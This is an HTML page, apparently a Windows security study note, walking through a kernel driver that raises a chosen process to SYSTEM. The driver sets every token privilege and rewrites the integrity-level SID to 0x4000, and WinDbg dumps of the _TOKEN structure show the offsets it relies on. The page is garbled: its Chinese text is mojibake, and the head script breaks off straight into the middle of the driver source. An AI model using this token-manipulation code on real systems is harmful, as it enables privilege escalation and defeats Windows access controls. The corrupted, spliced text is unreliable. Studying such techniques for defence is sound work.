<!DOCTYPE html>
<html lang="en">
<head>
  
  
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    
    
    <link rel="shortcut icon" href="../../img/favicon.ico">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
    <title>!!Windowså®‰å…¨ç¬”è®° - Share Docs</title>
    <link href="../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
    <link href="../../css/font-awesome-4.7.0.css" rel="stylesheet">
    <link href="../../css/base.css" rel="stylesheet">
    <link rel="stylesheet" href="../../css/highlight.css">
    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
    <![endif]-->

    <script src="../../js/jquery-3.2.1.min.js"></script>
    <script src="../../js/bootstrap-3.3.7.min.js"></script>
    <script src="../../js/highlight.pack.js"></script>
    
    <base target="_top">
    <script>
      var base_url = '../..';
      var is_top_frame = false;
        
        var pageToc = [
          {title: "SYSCALL", url: "#_top", children: [
              {title: "Windows\u73af\u5b89\u5168\u4f53\u7cfb", url: "#windows" },

        DriverObject-&gt;DriverUnload = DriverUnload;
        DriverObject-&gt;MajorFunction[IRP_MJ_CREATE] = OnCreateClose;
        DriverObject-&gt;MajorFunction[IRP_MJ_CLOSE] = OnCreateClose;
        DriverObject-&gt;MajorFunction[IRP_MJ_DEVICE_CONTROL] = OnDeviceControl;

        KdPrint((DRIVER_PREFIX &quot;Driver is loaded successfully.\n&quot;));
    } while (false);

    if (!NT_SUCCESS(ntstatus) &amp;&amp; (pDeviceObject != nullptr))
        ::IoDeleteDevice(pDeviceObject);

    return ntstatus;
}
</code></pre>
<p>æ ¸å¿ƒåŠŸèƒ½å—</p>
<p>ä»£ç åˆ†æ®µ1</p>
<pre><code class="language-C">PEPROCESS pEprocess = nullptr;
auto pid = ::ULongToHandle(*(ULONG*)Irp-&gt;AssociatedIrp.SystemBuffer);
ntstatus = ::PsLookupProcessByProcessId(pid, &amp;pEprocess);
</code></pre>
<p>åˆå§‹åŒ–<code>pEprocess</code>ç»“æ„ä½“ï¼Œå°†è¯·æ±‚çš„è¿›ç¨‹è½¬æ¢ä¸º<code>handle</code>ï¼Œä½¿ç”¨<code>PsLookupProcessByProcessId</code>æŸ¥è¯¢æŒ‡å®š<code>PID</code>çš„<code>pEprocess</code>å­˜åˆ°<code>ntstatus</code></p>
<p><code>_KPROCESS</code>å’Œ<code>_eprocess</code>æ˜¯å­˜å‚¨è¿›ç¨‹ä¿¡æ¯çš„ç»“æ„ä½“ï¼Œåˆ†åˆ«è¡¨ç¤ºå†…æ ¸æ¨¡å¼ä¸‹å’Œç”¨æˆ·æ¨¡å¼ä¸‹çš„è¿›ç¨‹ä¿¡æ¯ã€‚</p>
<p>wwindbgè°ƒè¯•
æŸ¥æ‰¾æŒ‡å®šè¿›ç¨‹çš„<code>_eprocess</code>åœ°å€</p>
<pre><code class="language-C">1: kd&gt; !process 1be0 0
Searching for Process with Cid == 1be0
PROCESS ffff8f0f4d1ab080
    SessionId: 1  Cid: 1be0    Peb: 02768000  ParentCid: 04ac
    DirBase: 496ad000  ObjectTable: ffff9f07935a1a00  HandleCount:  94.
    Image: cmd.exe
</code></pre>
<p>ä»£ç åˆ†æ®µ2</p>
<pre><code class="language-C">PACCESS_TOKEN pPrimaryToken = ::PsReferencePrimaryToken(pEprocess);
//æ ¹æ®eprocessè·å–PrimaryTokenåœ°å€ï¼Œå³_tokenç»“æ„ä½“

auto pSepToken = (PSEP_TOKEN_PRIVILEGES)((ULONG_PTR)pPrimaryToken + g_PrivilegesOffset);
//æ ¹æ®tokenè·å–Privileges

auto nUserAndGroupCount = *(ULONG*)((ULONG_PTR)pPrimaryToken + g_UserAndGroupCountOffset);
//æ ¹æ®tokenè·å–UserAndGroupCount

auto pUserAndGroups = *(PSID_AND_ATTRIBUTES*)((ULONG_PTR)pPrimaryToken + g_UserAndGroupsOffset);
//æ ¹æ®tokenè·å–UserAndGroups

auto nIntegrityLevelIndex = *(ULONG*)((ULONG_PTR)pPrimaryToken + g_IntegrityLevelIndexOffset);`
//æ ¹æ®tokenè·å–IntegrityLevelIndex


//ä¿®æ”¹ä»¤ç‰Œæƒé™
pSepToken-&gt;Present = VALID_PRIVILEGE_MASK;    //PresentæŒ‡ç¤ºå“ªäº›ç‰¹æƒåœ¨ä»¤ç‰Œä¸­å­˜åœ¨
pSepToken-&gt;Enabled = VALID_PRIVILEGE_MASK;    //EnabledæŒ‡ç¤ºå“ªäº›ç‰¹æƒè¢«æ¿€æ´»ï¼Œè¿›ç¨‹å¯è‡ªå®šä¹‰
pSepToken-&gt;EnabledByDefault = VALID_PRIVILEGE_MASK;   //EnabledByDefaultæŒ‡ç¤ºå“ªäº›ç‰¹æƒé»˜è®¤è¢«æ¿€æ´»ï¼Œè¿›ç¨‹æ— éœ€å®šä¹‰å¯ç›´æ¥ä½¿ç”¨

//ä¿®æ”¹`SID`ç»“æ„ä½“çš„`SubAuthority`ç¬¬ä¸€ä¸ªå…ƒç´ ä¸º`0x4000`
auto pSid = (PISID)pUserAndGroups[nIntegrityLevelIndex].Sid;
pSid-&gt;SubAuthority[0] = 0x4000;

KdPrint((DRIVER_PREFIX &quot;Integrity level of PID %u is modified to System level.\n&quot;, HandleToULong(pid)));
</code></pre>
<p>çœ‹<code>token</code>ç»“æ„ä½“ï¼Œæ ¸å¿ƒåŠŸèƒ½ä»£ç åŸºæœ¬éƒ½æ˜¯å¯¹<code>token</code>è¿›è¡Œä¿®æ”¹ä»¥å®ç°<code>SYSTEM</code></p>
<pre><code class="language-C">1: kd&gt; dt _token
nt!_TOKEN
   +0x000 TokenSource      : _TOKEN_SOURCE
   +0x010 TokenId          : _LUID
   +0x018 AuthenticationId : _LUID
   +0x020 ParentTokenId    : _LUID
   +0x028 ExpirationTime   : _LARGE_INTEGER
   +0x030 TokenLock        : Ptr64 _ERESOURCE
   +0x038 ModifiedId       : _LUID
   +0x040 Privileges       : _SEP_TOKEN_PRIVILEGES  //g_PrivilegesOffsetçš„å€¼
   +0x058 AuditPolicy      : _SEP_AUDIT_POLICY
   +0x078 SessionId        : Uint4B
   +0x07c UserAndGroupCount : Uint4B           //g_UserAndGroupCountOffsetçš„å€¼
   +0x080 RestrictedSidCount : Uint4B
   +0x084 VariableLength   : Uint4B
   +0x088 DynamicCharged   : Uint4B
   +0x08c DynamicAvailable : Uint4B
   +0x090 DefaultOwnerIndex : Uint4B
   +0x098 UserAndGroups    : Ptr64 _SID_AND_ATTRIBUTES  //g_UserAndGroupsOffsetçš„å€¼
   +0x0a0 RestrictedSids   : Ptr64 _SID_AND_ATTRIBUTES
   +0x0a8 PrimaryGroup     : Ptr64 Void
   +0x0b0 DynamicPart      : Ptr64 Uint4B
   +0x0b8 DefaultDacl      : Ptr64 _ACL
   +0x0c0 TokenType        : _TOKEN_TYPE
   +0x0c4 ImpersonationLevel : _SECURITY_IMPERSONATION_LEVEL
   +0x0c8 TokenFlags       : Uint4B             //g_TokenFlagsOffsetçš„å€¼
   +0x0cc TokenInUse       : UChar
   +0x0d0 IntegrityLevelIndex : Uint4B          //g_IntegrityLevelIndexOffsetçš„å€¼
   +0x0d4 MandatoryPolicy  : Uint4B
   +0x0d8 LogonSession     : Ptr64 _SEP_LOGON_SESSION_REFERENCES
   +0x0e0 OriginatingLogonSession : _LUID
   +0x0e8 SidHash          : _SID_AND_ATTRIBUTES_HASH
   +0x1f8 RestrictedSidHash : _SID_AND_ATTRIBUTES_HASH
   +0x308 pSecurityAttributes : Ptr64 _AUTHZBASEP_SECURITY_ATTRIBUTES_INFORMATION
   +0x310 Package          : Ptr64 Void
   +0x318 Capabilities     : Ptr64 _SID_AND_ATTRIBUTES
   +0x320 CapabilityCount  : Uint4B
   +0x328 CapabilitiesHash : _SID_AND_ATTRIBUTES_HASH
   +0x438 LowboxNumberEntry : Ptr64 _SEP_LOWBOX_NUMBER_ENTRY
   +0x440 LowboxHandlesEntry : Ptr64 _SEP_CACHED_HANDLES_ENTRY
   +0x448 pClaimAttributes : Ptr64 _AUTHZBASEP_CLAIM_ATTRIBUTES_COLLECTION
   +0x450 TrustLevelSid    : Ptr64 Void
   +0x458 TrustLinkedToken : Ptr64 _TOKEN
   +0x460 IntegrityLevelSidValue : Ptr64 Void
   +0x468 TokenSidValues   : Ptr64 _SEP_SID_VALUES_BLOCK
   +0x470 IndexEntry       : Ptr64 _SEP_LUID_TO_INDEX_MAP_ENTRY
   +0x478 DiagnosticInfo   : Ptr64 _SEP_TOKEN_DIAG_TRACK_ENTRY
   +0x480 BnoIsolationHandlesEntry : Ptr64 _SEP_CACHED_HANDLES_ENTRY
   +0x488 SessionObject    : Ptr64 Void
   +0x490 VariablePart     : Uint8B
</code></pre>
<p>æŸ¥çœ‹ä¸€ä¸‹è¿›ç¨‹å®é™…çš„å€¼ã€‚
é¦–å…ˆæ‰¾åˆ°tokenç»“æ„ä½“åœ°å€</p>
<pre><code class="language-C">1: kd&gt; !process 1be0 3
</code></pre>
<p><img alt="" src="../../images/Snipaste_2023-12-18_16-05-43.jpg" /></p>
<p>åœ¨<code>0x40</code>åç§»é‡å¤„æ‰¾åˆ°äº†<code>pPrimaryToken + g_PrivilegesOffset</code>çš„å€¼
å¥—åˆ°<code>_SEP_TOKEN_PRIVILEGES</code>ç»“æ„ä½“æ›´åŠ ç›´è§‚çš„å±•ç¤º</p>
<p>å’Œä»£ç ä¸­å®šä¹‰çš„å€¼æ˜¯ä¸€æ ·çš„</p>
<pre><code class="language-C">#define VALID_PRIVILEGE_MASK 0x0000001FFFFFFFFCULL
</code></pre>
<p><img alt="" src="../../images/Snipaste_2023-12-18_16-09-20.jpg" /></p>
<p>åœ¨<code>0x7c</code>åç§»é‡æ‰¾åˆ°<code>pPrimaryToken + g_UserAndGroupCountOffset</code>çš„å€¼
<img alt="" src="../../images/Snipaste_2023-12-18_17-04-59.jpg" /></p>
<p>åœ¨<code>0x98</code>åç§»é‡æ‰¾åˆ°<code>pPrimaryToken + g_UserAndGroupsOffset</code>çš„å€¼
